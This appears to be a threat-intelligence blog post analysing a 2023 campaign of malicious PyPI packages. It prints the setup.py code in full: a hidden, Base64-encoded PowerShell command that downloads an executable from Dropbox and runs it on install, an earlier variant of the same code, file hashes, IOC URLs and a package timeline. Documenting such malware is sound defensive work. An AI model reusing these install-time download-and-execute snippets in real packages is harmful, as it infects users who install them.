
On the morning of February 23, 2023, Phylum’s automated risk detection platform started lighting up with another series of strange publications on PyPI. After digging into it, we were able to link it up to another smaller campaign from January of 2023.
The Scope
First, we can confirm that this is an ongoing attack. As we worked on this write up we saw the list of packages published go from a few dozen to over 500! The most recent packages appear to be getting published at around one every 4-8 seconds so we suspect this may continue for some time. You can look at the Package Publication section at the bottom of this post to see the packages we’ve seen (as of the publication of this post we’ve already seen 520 1,138 5,943 packages published) and their publication dates.
This doesn’t appear to be a typosquatting attack so we are currently unsure what significance the names of the packages serve.
Despite the huge number of packages, thankfully we expect the fallout from this attack to be relatively small because of PyPI’s extremely quick takedown response.
The Maliciousness
This maliciousness is contained in the setup.py file and contains the following snippet:
if not os.path.exists('tahg'):
    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
except: pass
The -EncodedCommand flag passed to the Powershell command should catch your attention. It allows the attacker to execute a Powershell command that has been Base64-Encoded. This is obviously a simple obfuscation attempt to hide the attacker’s intention. Decoded, the string resolves to:
powershell Invoke-WebRequest -Uri "https://dl.dropbox.com/s/szgnyt9zbub0qmv/Esquele.exe?dl=0" -OutFile "~/WindowsCache.exe"; Invoke-Expression "~/WindowsCache.exe"
It downloads a remote executable from a Dropbox link and saves it locally to a file called “WindowsCache.exe” and then tries to directly execute that file with the Invoke-Expression command.
The executable Esquele.exe is a stage 1 dropper written in Rust. The second stage is Python compiled with Nuikta. Running the second stage will drop a handful of binaries to disk. Each of these has been identified as malware.
Esquele.exe (Stage 1)          8ab8ddfa3f61334cf9386b62aea3a761852b3d785d9f21b8a638cc42b0af7afd
Vanguard Tray Notification.exe 8713178131b9c12b07a5c702b6119be4d314bc216aed574ac4a8cd6d7b7fe063
NvidiaLTD.exe                 8713178131b9c12b07a5c702b6119be4d314bc216aed574ac4a8cd6d7b7fe063
Update.vbs                     bdef8d97c8590d4b655fa350e3a0a6f07f34dcd153ed60c0d2edf864a97012d3
Intel Graphics.exe             8713178131b9c12b07a5c702b6119be4d314bc216aed574ac4a8cd6d7b7fe063
9787.exe                       9738bc959696164a4a55e5ebf185de7d8e1cf37f1cd982cbe95d8f2a6662d3c8
4448.exe                       e63facb4fc6afd61d4fe681481c4528424930f46bd53ba2555c498943e569063
Additionally, we should note the following IOCs:
https://dl.dropbox[.]com/s/szgnyt9zbub0qmv/Esquele.exe
https://dl.dropbox[.]com/s/safqez76opk5ass/EsqueleStealer.exe
This is Probably Not Their First Attack on PyPI
We suspect the actors behind this attack are the same ones behind an attack in January of 2023 where we saw the publication of httpslib, colorslib, and libhttps. In these libraries the attacker used a very similar snippet in the setup.py file:
try:
  import os
  try:
    import subprocess
  except:
    os.system("pip install subprocess||python -m pip install subprocess")
    import subprocess
  creationflags = subprocess.CREATE_NO_WINDOW
  subprocess.run('powershell Invoke-WebRequest -Uri "https://dl.dropbox.com/s/mkd3enun97s8zag/Oxzy.exe?dl=0" -OutFile "~/WindowsCache.exe"; Invoke-Expression "~/WindowsCache.exe"')
As we can see in these attacks, there’s the similar Powershell commands, the dropbox link and the renaming of the executable to “WindowsCache.exe”.
As an aside, in January we also discovered the publication of fredmi, fredli, frekpy, and derkpy. These were released in the days leading up to the publications of httpslib, colorslib, and libhttps and appear to be practice and experimentation releases to test and/or hone their final code.
The Package Publication Timeline List
vminfo@2.49 - Publish Time: 2023-02-23 08:56:48
getpyw@2.11 - Publish Time: 2023-02-23 08:57:06
guicandy@8.22 - Publish Time: 2023-02-23 08:57:10
rammine@2.47 - Publish Time: 2023-02-23 08:57:36
ramram@5.8 - Publish Time: 2023-02-23 08:57:39
ultrapost@5.51 - Publish Time: 2023-02-23 08:57:43
candyad@1.54 - Publish Time: 2023-02-23 08:57:46
postinfo@4.72 - Publish Time: 2023-02-23 08:57:50
candyhttp@9.51 - Publish Time: 2023-02-23 08:57:53
toolmc@6.54 - Publish Time: 2023-02-23 08:57:57
httpmc@10.3 - Publish Time: 2023-02-23 08:58:00
minepost@5.42 - Publish Time: 2023-02-23 08:58:03
urlultra@7.48 - Publish Time: 2023-02-23 08:58:07
loadlib@3.65 - Publish Time: 2023-02-23 08:58:10
mcpyw@4.76 - Publish Time: 2023-02-23 08:58:14
grandpy@5.75 - Publish Time: 2023-02-23 08:58:17
craftre@5.29 - Publish Time: 2023-02-23 08:58:20
mcgrand@1.69 - Publish Time: 2023-02-23 08:58:24
vminfo@6.6 - Publish Time: 2023-02-23 08:58:28
cpucpu@6.78 - Publish Time: 2023-02-23 08:58:31
guiad@1.99 - Publish Time: 2023-02-23 08:58:35
guivm@3.3 - Publish Time: 2023-02-23 08:58:40
gamecpu@8.39 - Publish Time: 2023-02-23 08:58:44
getload@5.63 - Publish Time: 2023-02-23 08:58:47
ramad@1.33 - Publish Time: 2023-02-23 08:58:50
candygrand@7.96 - Publish Time: 2023-02-23 08:58:53
toolpy@2.2 - Publish Time: 2023-02-23 08:58:57
mineinfo@4.92 - Publish Time: 2023-02-23 08:59:00
guicpu@8.33 - Publish Time: 2023-02-23 08:59:03
ramhttp@8.2 - Publish Time: 2023-02-23 08:59:07
mcsuper@9.41 - Publish Time: 2023-02-23 08:59:10
grandurl@7.97 - Publish Time: 2023-02-23 08:59:14
infogame@4.57 - Publish Time: 2023-02-23 08:59:17
pipmine@2.4 - Publish Time: 2023-02-23 08:59:21
revm@9.7 - Publish Time: 2023-02-23 08:59:24
httpad@2.8 - Publish Time: 2023-02-23 08:59:29
loadinfo@7.39 - Publish Time: 2023-02-23 08:59:32
pywload@7.4 - Publish Time: 2023-02-23 08:59:35
supertool@4.4 - Publish Time: 2023-02-23 08:59:39
infopost@1.11 - Publish Time: 2023-02-23 08:59:43
vmload@8.41 - Publish Time: 2023-02-23 08:59:46
recandy@10.58 - Publish Time: 2023-02-23 08:59:49
guicpu@8.58 - Publish Time: 2023-02-23 08:59:52
urlvm@1.94 - Publish Time: 2023-02-23 08:59:55
mineinfo@6.35 - Publish Time: 2023-02-23 08:59:59
minepost@7.87 - Publish Time: 2023-02-23 09:00:02
gamead@5.61 - Publish Time: 2023-02-23 09:00:07
loadpip@3.5 - Publish Time: 2023-02-23 09:00:10
mcre@10.24 - Publish Time: 2023-02-23 09:00:14
guigui@3.8 - Publish Time: 2023-02-23 09:00:17
pywtool@5.62 - Publish Time: 2023-02-23 09:00:21
libpip@9.37 - Publish Time: 2023-02-23 09:00:28
grandcpu@4.47 - Publish Time: 2023-02-23 09:00:32
adultra@1.46 - Publish Time: 2023-02-23 09:00:35
infogrand@1.8 - Publish Time: 2023-02-23 09:00:38
recraft@9.84 - Publish Time: 2023-02-23 09:00:41
ramcraft@8.61 - Publish Time: 2023-02-23 09:00:45
mcurl@7.64 - Publish Time: 2023-02-23 09:00:49
getpyw@6.63 - Publish Time: 2023-02-23 09:00:52
loadurl@4.41 - Publish Time: 2023-02-23 09:00:59
mcram@4.3 - Publish Time: 2023-02-23 09:01:02
gamehttp@6.13 - Publish Time: 2023-02-23 09:01:05
ramgrand@6.78 - Publish Time: 2023-02-23 09:01:09
supersuper@9.82 - Publish Time: 2023-02-23 09:01:15
ultraultra@1.29 - Publish Time: 2023-02-23 09:01:19
candytool@5.65 - Publish Time: 2023-02-23 09:01:23
raminfo@7.28 - Publish Time: 2023-02-23 09:01:26
candyurl@2.83 - Publish Time: 2023-02-23 09:01:30
httpsuper@5.37 - Publish Time: 2023-02-23 09:01:33
postcpu@2.2 - Publish Time: 2023-02-23 09:01:36
